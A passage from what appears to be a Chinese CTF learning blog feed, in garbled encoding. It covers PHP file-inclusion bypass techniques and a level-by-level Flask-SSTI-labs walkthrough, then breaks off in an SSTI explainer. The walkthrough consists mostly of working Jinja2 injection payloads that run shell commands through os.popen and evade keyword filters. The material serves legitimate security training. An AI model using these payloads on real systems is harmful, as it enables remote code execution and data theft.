id="ç»•è¿‡å§¿åŠ¿"><a href="#ç»•è¿‡å§¿åŠ¿" class="headerlink" title="ç»•è¿‡å§¿åŠ¿"></a>ç»•è¿‡å§¿åŠ¿</h2><p>å¹³å¸¸ç¢°åˆ°çš„æƒ…å†µè‚¯å®šä¸ä¼šæ˜¯ç®€ç®€å•å•çš„<code>include $_GET[&#39;file&#39;];</code>è¿™æ ·ç›´æ¥æŠŠå˜é‡ä¼ å…¥åŒ…å«å‡½æ•°çš„ã€‚åœ¨å¾ˆå¤šæ—¶å€™åŒ…å«çš„å˜é‡&#x2F;æ–‡ä»¶ä¸æ˜¯å®Œå…¨å¯æ§çš„ï¼Œæ¯”å¦‚ä¸‹é¢è¿™æ®µä»£ç æŒ‡å®šäº†å‰ç¼€å’Œåç¼€ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;/var/www/html/&#x27;</span>.<span class="hljs-variable">$file</span>.<span class="hljs-string">&#x27;/test/test.php&#x27;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>è¿™æ ·å°±å¾ˆâ€œéš¾â€ç›´æ¥å»åŒ…å«å‰é¢æåˆ°çš„ç§ç§æ–‡ä»¶ã€‚</p><h3 id="æŒ‡å®šå‰ç¼€"><a href="#æŒ‡å®šå‰ç¼€" class="headerlink" title="æŒ‡å®šå‰ç¼€"></a>æŒ‡å®šå‰ç¼€</h3><p>å…ˆè€ƒè™‘ä¸€ä¸‹æŒ‡å®šäº†å‰ç¼€çš„æƒ…å†µå§ã€‚æµ‹è¯•ä»£ç :</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;/var/www/html/&#x27;</span>.<span class="hljs-variable">$file</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h3 id="ç›®å½•éå†"><a href="#ç›®å½•éå†" class="headerlink" title="ç›®å½•éå†"></a>ç›®å½•éå†</h3><p>è¿™ä¸ªæœ€ç®€å•äº†ï¼Œç®€è¦çš„æä¸€ä¸‹ã€‚</p><p>ç°åœ¨åœ¨&#x2F;var&#x2F;log&#x2F;test.txtæ–‡ä»¶ä¸­æœ‰phpä»£ç <code>&lt;?php phpinfo();?&gt;</code>ï¼Œåˆ™åˆ©ç”¨<code>../</code>å¯ä»¥è¿›è¡Œç›®å½•éå†ï¼Œæ¯”å¦‚æˆ‘ä»¬å°è¯•è®¿é—®ï¼š</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stata"><span class="hljs-keyword">include</span>.php?<span class="hljs-keyword">file</span>=../../<span class="hljs-keyword">log</span>/<span class="hljs-keyword">test</span>.txt<br></code></pre></td></tr></table></figure><p>åˆ™æœåŠ¡å™¨ç«¯å®é™…æ‹¼æ¥å‡ºæ¥çš„è·¯å¾„ä¸ºï¼š&#x2F;var&#x2F;www&#x2F;html&#x2F;..&#x2F;..&#x2F;log&#x2F;test.txtï¼Œä¹Ÿå³&#x2F;var&#x2F;log&#x2F;test.txtã€‚ä»è€ŒåŒ…å«æˆåŠŸã€‚</p><h3 id="ç¼–ç ç»•è¿‡"><a href="#ç¼–ç ç»•è¿‡" class="headerlink" title="ç¼–ç ç»•è¿‡"></a>ç¼–ç ç»•è¿‡</h3><p>æœåŠ¡å™¨ç«¯å¸¸å¸¸ä¼šå¯¹äº<code>../</code>ç­‰åšä¸€äº›è¿‡æ»¤ï¼Œå¯ä»¥ç”¨ä¸€äº›ç¼–ç æ¥è¿›è¡Œç»•è¿‡ã€‚</p><ul><li>åˆ©ç”¨urlç¼–ç <ul><li>..&#x2F;<ul><li>%2e%2e%2f</li><li>..%2f</li><li>%2e%2e&#x2F;</li></ul></li><li>..\<ul><li>%2e%2e%5c</li><li>..%5c</li><li>%2e%2e\</li></ul></li></ul></li><li>äºŒæ¬¡ç¼–ç <ul><li>..&#x2F;<ul><li>%252e%252e%252f</li></ul></li><li>..\<ul><li>%252e%252e%255c</li></ul></li></ul></li><li>å®¹å™¨&#x2F;æœåŠ¡å™¨çš„ç¼–ç æ–¹å¼<ul><li>..&#x2F;<ul><li>..%c0%af<ul><li>æ³¨ï¼š<a href="https://security.stackexchange.com/questions/48879/why-does-directory-traversal-attack-c0af-work">Why does Directory traversal attack %C0%AF work?</a></li></ul></li><li>%c0%ae%c0%ae&#x2F;<ul><li>æ³¨ï¼šjavaä¸­ä¼šæŠŠâ€%c0%aeâ€è§£æä¸ºâ€\uC0AEâ€ï¼Œæœ€åè½¬ä¹‰ä¸ºASCCIIå­—ç¬¦çš„â€.â€ï¼ˆç‚¹ï¼‰</li><li>Apache Tomcat Directory Traversal</li></ul></li></ul></li><li>..\<ul><li>..%c1%9c</li></ul></li></ul></li></ul><h3 id="æŒ‡å®šåç¼€"><a href="#æŒ‡å®šåç¼€" class="headerlink" title="æŒ‡å®šåç¼€"></a>æŒ‡å®šåç¼€</h3><p>æ¥ç€è€ƒè™‘æŒ‡å®šåç¼€çš„æƒ…å†µã€‚æµ‹è¯•ä»£ç :</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br><span class="hljs-keyword">include</span> <span class="hljs-variable">$file</span>.<span class="hljs-string">&#x27;/test/test.php&#x27;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h3 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h3><p>urlæ ¼å¼ï¼š</p><h4 id="å§¿åŠ¿ä¸€ï¼šqueryï¼ˆï¼Ÿï¼‰"><a href="#å§¿åŠ¿ä¸€ï¼šqueryï¼ˆï¼Ÿï¼‰" class="headerlink" title="å§¿åŠ¿ä¸€ï¼šqueryï¼ˆï¼Ÿï¼‰"></a>å§¿åŠ¿ä¸€ï¼šqueryï¼ˆï¼Ÿï¼‰</h4><p>åŸç†ï¼šæµè§ˆå™¨æˆ–æœåŠ¡å™¨ä¼šæŠŠ <code>?.php</code> å½“æˆâ€œè¯·æ±‚å‚æ•°â€ï¼Œè€Œä¸æ˜¯æ–‡ä»¶åçš„ä¸€éƒ¨åˆ†ã€‚</p><figure class="highlight delphi"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs delphi"><span class="hljs-keyword">index</span>.php?<span class="hljs-keyword">file</span>=http:<span class="hljs-comment">//remoteaddr/remoteinfo.txt?</span><br></code></pre></td></tr></table></figure><h4 id="å§¿åŠ¿äºŒï¼šfragmentï¼ˆ-ï¼‰"><a href="#å§¿åŠ¿äºŒï¼šfragmentï¼ˆ-ï¼‰" class="headerlink" title="å§¿åŠ¿äºŒï¼šfragmentï¼ˆ#ï¼‰"></a>å§¿åŠ¿äºŒï¼šfragmentï¼ˆ#ï¼‰</h4><p>åŸç†ï¼šURL é‡Œçš„ <code>#</code> è¡¨ç¤º <strong>ç‰‡æ®µå®šä½ç¬¦ï¼ˆfragmentï¼‰</strong>ï¼Œæµè§ˆå™¨åªåœ¨æœ¬åœ°è§£æï¼Œä¸ä¼šä¼ ç»™è¿œç¨‹æœåŠ¡å™¨ã€‚</p><figure class="highlight delphi"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs delphi"><span class="hljs-keyword">index</span>.php?<span class="hljs-keyword">file</span>=http:<span class="hljs-comment">//remoteaddr/remoteinfo.txt%23</span><br></code></pre></td></tr></table></figure><h3 id="åˆ©ç”¨åè®®"><a href="#åˆ©ç”¨åè®®" class="headerlink" title="åˆ©ç”¨åè®®"></a>åˆ©ç”¨åè®®</h3><p>å‰é¢æœ‰æåˆ°è¿‡åˆ©ç”¨zipåè®®å’Œpharåè®®ã€‚</p><h3 id="é•¿åº¦æˆªæ–­"><a href="#é•¿åº¦æˆªæ–­" class="headerlink" title="é•¿åº¦æˆªæ–­"></a>é•¿åº¦æˆªæ–­</h3><p>åˆ©ç”¨æ¡ä»¶ï¼š phpç‰ˆæœ¬ &lt; php 5.2.8</p><p>ç›®å½•å­—ç¬¦ä¸²ï¼Œåœ¨linuxä¸‹4096å­—èŠ‚æ—¶ä¼šè¾¾åˆ°æœ€å¤§å€¼ï¼Œåœ¨windowä¸‹æ˜¯256å­—èŠ‚ã€‚åªè¦ä¸æ–­çš„é‡å¤<code>./</code></p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle">index.php?<span class="hljs-keyword">file</span>=.<span class="hljs-regexp">/./</span>.<span class="hljs-regexp">/./</span>ã€‚ã€‚ã€‚çœç•¥ã€‚ã€‚ã€‚.<span class="hljs-regexp">/./</span>shell.txt<br></code></pre></td></tr></table></figure><p>åˆ™åç¼€<code>/test/test.php</code>ï¼Œåœ¨è¾¾åˆ°æœ€å¤§å€¼åä¼šè¢«ç›´æ¥ä¸¢å¼ƒæ‰ã€‚</p><h3 id="0å­—èŠ‚æˆªæ–­"><a href="#0å­—èŠ‚æˆªæ–­" class="headerlink" title="0å­—èŠ‚æˆªæ–­"></a>0å­—èŠ‚æˆªæ–­</h3><p>åˆ©ç”¨æ¡ä»¶ï¼š phpç‰ˆæœ¬ &lt; php 5.3.4</p><figure class="highlight delphi"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs delphi"><span class="hljs-keyword">index</span>.php?<span class="hljs-keyword">file</span>=phpinfo.txt<span class="hljs-number">%00</span><br></code></pre></td></tr></table></figure><p>èƒ½åˆ©ç”¨00æˆªæ–­çš„åœºæ™¯ç°åœ¨åº”è¯¥å¾ˆå°‘äº†ï¼šï¼‰</p><h1 id="Reffeerence"><a href="#Reffeerence" class="headerlink" title="Reffeerence"></a>Reffeerence</h1><p><a href="https://chybeta.github.io/2017/10/08/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/#%E5%8C%85%E5%90%ABsession">phpæ–‡ä»¶åŒ…å«æ¼æ´ | Chybeta</a></p><p><a href="https://blog.csdn.net/m0_46467017/article/details/126380415">æ–‡ä»¶åŒ…å«æ¼æ´å…¨é¢è¯¦è§£-CSDNåšå®¢</a></p>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
      <category>åŸºç¡€çŸ¥è¯†</category>
      
      <category>å®æ“</category>
      
    </categories>
    
    
    <tags>
      
      <tag>æ–‡ä»¶åŒ…å«</tag>
      
      <tag>phpä¼ªåè®®</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Flask-SSTI-labs é€šå…³è®°å½•</title>
    <link href="/2025/07/21/Flask-SSTI-labs-%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/"/>
    <url>/2025/07/21/Flask-SSTI-labs-%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/</url>
    
    <content type="html"><![CDATA[<h1 id="Flask-SSTI-labs-é€šå…³è®°å½•"><a href="#Flask-SSTI-labs-é€šå…³è®°å½•" class="headerlink" title="Flask-SSTI-labs é€šå…³è®°å½•"></a>Flask-SSTI-labs é€šå…³è®°å½•</h1><p>æ­å»ºç¯å¢ƒ</p><p>å»ºè®®ç”¨nssctfåœ¨çº¿ <a href="https://www.nssctf.cn/problem/13">https://www.nssctf.cn/problem/13</a> ç›´æ¥ç”¨</p><p><img src="https://raw.githubusercontent.com/everythingis-ok/image/main/PixPin_2025-07-21_10-39-33.png" alt="PixPin_2025-07-21_10-39-33"></p><h2 id="Level-1-no-waf"><a href="#Level-1-no-waf" class="headerlink" title="Level 1 no waf"></a>Level 1 no waf</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">&#123;% raw %&#125;<br>&#123;<span class="hljs-string">&#x27;code&#x27;</span>: <span class="hljs-string">&quot;&#123;&#123;(sbwaf.__eq__.__globals__.sys.modules.os.popen(&#x27;cat /app/flag&#x27;)).read()&#125;&#125;&quot;</span>&#125;<br>&#123;% endraw %&#125;<br></code></pre></td></tr></table></figure><h2 id="Level-2-bl-â€˜-123-123-â€™"><a href="#Level-2-bl-â€˜-123-123-â€™" class="headerlink" title="Level 2 bl[â€˜&#123;&#123;â€™]"></a>Level 2 bl[â€˜&#123;&#123;â€™]</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">&#123;% raw %&#125;<br>&#123;<span class="hljs-string">&#x27;code&#x27;</span>: <span class="hljs-string">&quot;&#123;%print (sbwaf.__eq__.__globals__.sys.modules.os.popen(&#x27;cat /app/flag&#x27;)).read()%&#125;&quot;</span>&#125;<br>&#123;% endraw %&#125;<br></code></pre></td></tr></table></figure><h2 id="Level-3-no-waf-and-blind"><a href="#Level-3-no-waf-and-blind" class="headerlink" title="Level 3 no waf and blind"></a>Level 3 no waf and blind</h2><p>åœ¨ Flask ä¸­ï¼Œ<strong>é™æ€ç›®å½•</strong>ï¼ˆ<code>static</code>ï¼‰æ˜¯ç”¨æ¥å­˜æ”¾é™æ€æ–‡ä»¶çš„ï¼Œä¾‹å¦‚ï¼š</p><ul><li>CSS æ ·å¼è¡¨</li><li>JavaScript è„šæœ¬</li><li>å›¾ç‰‡ï¼ˆå¦‚ PNGã€JPGã€SVGï¼‰</li><li>å­—ä½“æ–‡ä»¶ï¼ˆå¦‚ TTFã€WOFFï¼‰</li><li>å…¶ä»–å‰ç«¯èµ„æº</li></ul><p><strong>å¦‚ä½•è®¿é—®é™æ€æ–‡ä»¶</strong></p><p>åœ¨æµè§ˆå™¨ä¸­è®¿é—®çš„ URL ä¸ºï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">http://localhost:5000/static/css/style.css<br></code></pre></td></tr></table></figure><p>Flask ä¼šè‡ªåŠ¨å°† <code>static</code> ç›®å½•ä¸­çš„æ–‡ä»¶æ˜ å°„ä¸º <code>/static/</code> è·¯å¾„å¼€å¤´çš„ URLã€‚</p><p>å¾€ Flask çš„é™æ€ç›®å½•å†™å…¥ä¸€ä¸ªæ–‡ä»¶ï¼Œå‡†å¤‡â€œ<strong>ç›²æ‰“æ–‡ä»¶</strong>â€ç„¶åä»å‰ç«¯é¡µé¢è¯»å–ç»“æœï¼Œè¿™æ˜¯ä¸€ç§<strong>ç›²æ³¨å›æ˜¾æ›¿ä»£æ–¹å¼</strong>ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">&#123;% raw %&#125;<br>&#123;&#123;lipsum.__globals__[<span class="hljs-string">&#x27;os&#x27;</span>].popen(<span class="hljs-string">&#x27;echo &quot;test&quot; &gt;/app/static/1.txt&#x27;</span>).<span class="hljs-built_in">read</span>()&#125;&#125;<br>&#123;% endraw %&#125;<br></code></pre></td></tr></table></figure><p>æˆåŠŸå†™å…¥ static é™æ€ç›®å½•,</p><p>è¯»å– flagï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">&#123;% raw %&#125;<br>code=&#123;&#123;lipsum.__globals__[<span class="hljs-string">&#x27;os&#x27;</span>].popen(<span class="hljs-string">&#x27;echo `cat /app/flag` &gt;/app/static/1.txt&#x27;</span>).<span class="hljs-built_in">read</span>()&#125;&#125;<br>&#123;% endraw %&#125;<br></code></pre></td></tr></table></figure><p><img src="D:\work\notebook\ontebook\CTF\webå­¦ä¹ \SSTIæ¼æ´å­¦ä¹ \assets\PixPin_2025-07-21_12-11-53.png" alt="PixPin_2025-07-21_12-11-53"></p><h2 id="Level-4-bl-â€˜-â€™-â€˜-â€™"><a href="#Level-4-bl-â€˜-â€™-â€˜-â€™" class="headerlink" title="Level 4 bl[â€˜[â€™, â€˜]â€™]"></a>Level 4 bl[â€˜[â€™, â€˜]â€™]</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">&#123;% raw %&#125;<br>&#123;<span class="hljs-string">&#x27;code&#x27;</span>: <span class="hljs-string">&quot;&#123;&#123;(sbwaf.__eq__.__globals__.sys.modules.os.popen(&#x27;cat /app/flag&#x27;)).read()&#125;&#125;&quot;</span>&#125;<br>&#123;% endraw %&#125;<br></code></pre></td></tr></table></figure><h2 id="Level-5-bl-â€˜â€™â€™-â€˜â€œâ€™"><a href="#Level-5-bl-â€˜â€™â€™-â€˜â€œâ€™" class="headerlink" title="Level 5 bl[â€˜â€™â€™, â€˜â€œâ€™]"></a>Level 5 bl[â€˜â€™â€™, â€˜â€œâ€™]</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">&#123;% raw %&#125;<br>&#123;<span class="hljs-string">&#x27;code&#x27;</span>: <span class="hljs-string">&#x27;&#123;&#123;(sbwaf.__eq__.__globals__.sys.modules.os.popen(((lipsum()|urlencode|first+dict(c=i)|join)*13)%(99,97,116,32,47,97,112,112,47,102,108,97,103))).read()&#125;&#125;&#x27;</span>&#125;<br>&#123;% endraw %&#125;<br></code></pre></td></tr></table></figure><h2 id="Level-6-bl-â€˜-â€™"><a href="#Level-6-bl-â€˜-â€™" class="headerlink" title="Level 6 bl[â€˜_â€™]"></a>Level 6 bl[â€˜_â€™]</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">&#123;% raw %&#125;<br>&#123;<span class="hljs-string">&#x27;code&#x27;</span>: <span class="hljs-string">&#x27;&#123;&#123;((sbwaf|attr(&quot;%c&quot;%95+&quot;%c&quot;%95+\&#x27;</span>eq\&#x27;+<span class="hljs-string">&quot;%c&quot;</span>%95+<span class="hljs-string">&quot;%c&quot;</span>%95))[<span class="hljs-string">&quot;%c&quot;</span>%95+<span class="hljs-string">&quot;%c&quot;</span>%95+\&#x27;globals\&#x27;+<span class="hljs-string">&quot;%c&quot;</span>%95+<span class="hljs-string">&quot;%c&quot;</span>%95].sys.modules.os.popen(\&#x27;<span class="hljs-built_in">cat</span> /app/flag\&#x27;)).<span class="hljs-built_in">read</span>()&#125;&#125;<span class="hljs-string">&#x27;&#125;</span><br><span class="hljs-string">&#123;% endraw %&#125;</span><br></code></pre></td></tr></table></figure><h2 id="Level-7-bl-â€˜-â€™"><a href="#Level-7-bl-â€˜-â€™" class="headerlink" title="Level 7 bl[â€˜.â€™]"></a>Level 7 bl[â€˜.â€™]</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">&#123;% raw %&#125;<br>&#123;<span class="hljs-string">&#x27;code&#x27;</span>: <span class="hljs-string">&quot;&#123;&#123;((sbwaf|attr(&#x27;__eq__&#x27;))[&#x27;__globals__&#x27;][&#x27;sys&#x27;][&#x27;modules&#x27;][&#x27;os&#x27;][&#x27;popen&#x27;](&#x27;cat /app/flag&#x27;))[&#x27;read&#x27;]()&#125;&#125;&quot;</span>&#125;<br>&#123;% endraw %&#125;<br></code></pre></td></tr></table></figure><h2 id="Level-8-bl-â€œclassâ€-â€œargâ€-â€œformâ€-â€œvalueâ€-â€œdataâ€-â€œrequestâ€-â€œinitâ€-â€œglobalâ€-â€œopenâ€-â€œmroâ€-â€œbaseâ€-â€œattrâ€"><a href="#Level-8-bl-â€œclassâ€-â€œargâ€-â€œformâ€-â€œvalueâ€-â€œdataâ€-â€œrequestâ€-â€œinitâ€-â€œglobalâ€-â€œopenâ€-â€œmroâ€-â€œbaseâ€-â€œattrâ€" class="headerlink" title="Level 8 bl[â€œclassâ€, â€œargâ€, â€œformâ€, â€œvalueâ€, â€œdataâ€, â€œrequestâ€, â€œinitâ€, â€œglobalâ€, â€œopenâ€, â€œmroâ€, â€œbaseâ€, â€œattrâ€]"></a>Level 8 bl[â€œclassâ€, â€œargâ€, â€œformâ€, â€œvalueâ€, â€œdataâ€, â€œrequestâ€, â€œinitâ€, â€œglobalâ€, â€œopenâ€, â€œmroâ€, â€œbaseâ€, â€œattrâ€]</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">&#123;% raw %&#125;<br>&#123;<span class="hljs-string">&#x27;code&#x27;</span>: <span class="hljs-string">&quot;&#123;&#123;(sbwaf.__eq__[&#x27;__g&#x27;&#x27;lobals__&#x27;].sys.modules.os[&#x27;po&#x27;&#x27;pen&#x27;](&#x27;cat /app/flag&#x27;)).read()&#125;&#125;&quot;</span>&#125;<br>&#123;% endraw %&#125;<br></code></pre></td></tr></table></figure><h2 id="Level-9-bl-â€˜0-9â€™"><a href="#Level-9-bl-â€˜0-9â€™" class="headerlink" title="Level 9 bl[â€˜0-9â€™]"></a>Level 9 bl[â€˜0-9â€™]</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">&#123;% raw %&#125;<br>&#123;<span class="hljs-string">&#x27;code&#x27;</span>: <span class="hljs-string">&quot;&#123;&#123;(sbwaf.__eq__.__globals__.sys.modules.os.popen(&#x27;cat /app/flag&#x27;)).read()&#125;&#125;&quot;</span>&#125;<br>&#123;% endraw %&#125;<br></code></pre></td></tr></table></figure><h2 id="Level-10-set-config-None"><a href="#Level-10-set-config-None" class="headerlink" title="Level 10 set config &#x3D; None"></a>Level 10 set config &#x3D; None</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">&#123;% raw %&#125;<br>&#123;<span class="hljs-string">&#x27;code&#x27;</span>: <span class="hljs-string">&quot;&#123;&#123;(sbwaf.__eq__.__globals__.sys.modules.os.popen(&#x27;cat /app/flag&#x27;)).read()&#125;&#125;&quot;</span>&#125;<br>&#123;% endraw %&#125;<br></code></pre></td></tr></table></figure><h2 id="Level-11-bl-â€˜â€™â€™-â€˜â€œâ€™-â€˜-â€™-â€˜requestâ€™-â€˜-â€™-â€˜-â€™-â€˜-â€™"><a href="#Level-11-bl-â€˜â€™â€™-â€˜â€œâ€™-â€˜-â€™-â€˜requestâ€™-â€˜-â€™-â€˜-â€™-â€˜-â€™" class="headerlink" title="Level 11 bl[â€˜â€™â€™, â€˜â€œâ€™, â€˜+â€™, â€˜requestâ€™, â€˜.â€™, â€˜[â€™, â€˜]â€™]"></a>Level 11 bl[â€˜â€™â€™, â€˜â€œâ€™, â€˜+â€™, â€˜requestâ€™, â€˜.â€™, â€˜[â€™, â€˜]â€™]</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">&#123;% raw %&#125;<br>&#123;<span class="hljs-string">&#x27;code&#x27;</span>: <span class="hljs-string">&#x27;&#123;&#123;sbwaf|attr(lipsum|escape|batch(22)|list|first|last~lipsum|escape|batch(22)|list|first|last~dict(EQ=i)|first|lower~lipsum|escape|batch(22)|list|first|last~lipsum|escape|batch(22)|list|first|last)|attr(lipsum|escape|batch(22)|list|first|last~lipsum|escape|batch(22)|list|first|last~dict(GLOBALS=i)|first|lower~lipsum|escape|batch(22)|list|first|last~lipsum|escape|batch(22)|list|first|last)|attr(dict(GET=i)|first|lower)(dict(SYS=i)|first|lower)|attr(dict(MODULES=i)|first|lower)|attr(dict(GET=i)|first|lower)(dict(OS=i)|first|lower)|attr(dict(POPEN=i)|first|lower)(((lipsum()|urlencode|first~dict(c=i)|join)*13)%(99,97,116,32,47,97,112,112,47,102,108,97,103))|attr(dict(READ=i)|first|lower)()&#125;&#125;&#x27;</span>&#125;<br>&#123;% endraw %&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>SSTIæ¼æ´</title>
    <link href="/2025/07/18/SSTI%E6%BC%8F%E6%B4%9E/"/>
    <url>/2025/07/18/SSTI%E6%BC%8F%E6%B4%9E/</url>
    
    <content type="html"><![CDATA[<h1 id="SSTIæ¼æ´"><a href="#SSTIæ¼æ´" class="headerlink" title="SSTIæ¼æ´"></a>SSTIæ¼æ´</h1><h2 id="æ¨¡æ¿å¼•æ“"><a href="#æ¨¡æ¿å¼•æ“" class="headerlink" title="æ¨¡æ¿å¼•æ“"></a>æ¨¡æ¿å¼•æ“</h2><p>æ¨¡æ¿å¼•æ“ï¼ˆè¿™é‡Œç‰¹æŒ‡ç”¨äºWebå¼€å‘çš„æ¨¡æ¿å¼•æ“ï¼‰æ˜¯ä¸ºäº†ä½¿ç”¨æˆ·ç•Œé¢ä¸ä¸šåŠ¡æ•°æ®ï¼ˆå†…å®¹ï¼‰åˆ†ç¦»è€Œäº§ç”Ÿçš„ï¼Œå®ƒå¯ä»¥ç”Ÿæˆç‰¹å®šæ ¼å¼çš„æ–‡æ¡£ï¼Œåˆ©ç”¨æ¨¡æ¿å¼•æ“æ¥ç”Ÿæˆå‰ç«¯çš„htmlä»£ç ï¼Œæ¨¡æ¿å¼•æ“ä¼šæä¾›ä¸€å¥—ç”Ÿæˆhtmlä»£ç çš„ç¨‹åºï¼Œç„¶ååªéœ€è¦è·å–ç”¨æˆ·çš„æ•°æ®ï¼Œç„¶åæ”¾åˆ°æ¸²æŸ“å‡½æ•°é‡Œï¼Œç„¶åç”Ÿæˆæ¨¡æ¿+ç”¨æˆ·æ•°æ®çš„å‰ç«¯htmlé¡µé¢ï¼Œç„¶ååé¦ˆç»™æµè§ˆå™¨ï¼Œå‘ˆç°åœ¨ç”¨æˆ·é¢å‰ã€‚</p><h2 id="SSTI"><a href="#SSTI" class="headerlink" title="SSTI"></a>SSTI</h2><p>SSTI å°±æ˜¯æœåŠ¡å™¨ç«¯æ¨¡æ¿æ³¨å…¥ï¼ˆServer-Side Template Injectionï¼‰</p><p>å½“å‰ä½¿ç”¨çš„ä¸€äº›æ¡†æ¶ï¼Œæ¯”å¦‚pythonçš„flaskï¼Œphpçš„tpï¼Œjavaçš„springç­‰ä¸€èˆ¬éƒ½é‡‡ç”¨æˆç†Ÿçš„çš„MVCçš„æ¨¡å¼ï¼Œç”¨æˆ·çš„è¾“å…¥å…ˆè¿›å…¥Controlleræ§åˆ¶å™¨ï¼Œç„¶åæ ¹æ®è¯·æ±‚ç±»å‹å’Œè¯·æ±‚çš„æŒ‡ä»¤å‘é€ç»™å¯¹åº”Modelä¸šåŠ¡æ¨¡å‹è¿›è¡Œä¸šåŠ¡é€»è¾‘åˆ¤æ–­ï¼Œæ•°æ®åº“å­˜å–ï¼Œæœ€åæŠŠç»“æœè¿”å›ç»™Viewè§†å›¾å±‚ï¼Œç»è¿‡æ¨¡æ¿æ¸²æŸ“å±•ç¤ºç»™ç”¨æˆ·ã€‚</p><p>æ¼æ´æˆå› å°±æ˜¯æœåŠ¡ç«¯æ¥æ”¶äº†ç”¨æˆ·çš„æ¶æ„è¾“å…¥ä»¥åï¼Œæœªç»ä»»ä½•å¤„ç†å°±å°†å…¶ä½œä¸º Web åº”ç”¨æ¨¡æ¿å†…å®¹çš„ä¸€éƒ¨åˆ†ï¼Œæ¨¡æ¿å¼•æ“åœ¨è¿›è¡Œç›®æ ‡ç¼–è¯‘æ¸²æŸ“çš„è¿‡ç¨‹ä¸­ï¼Œæ‰§è¡Œäº†ç”¨æˆ·æ’å…¥çš„å¯ä»¥ç ´åæ¨¡æ¿çš„è¯­å¥ï¼Œå› è€Œå¯èƒ½å¯¼è‡´äº†æ•æ„Ÿä¿¡æ¯æ³„éœ²ã€ä»£ç æ‰§è¡Œã€GetShell ç­‰é—®é¢˜ã€‚å…¶å½±å“èŒƒå›´ä¸»è¦å–å†³äºæ¨¡ç‰ˆå¼•æ“çš„å¤æ‚æ€§ã€‚</p><p>å‡¡æ˜¯ä½¿ç”¨æ¨¡æ¿çš„åœ°æ–¹éƒ½å¯èƒ½ä¼šå‡ºç° SSTI çš„é—®é¢˜ï¼ŒSSTI 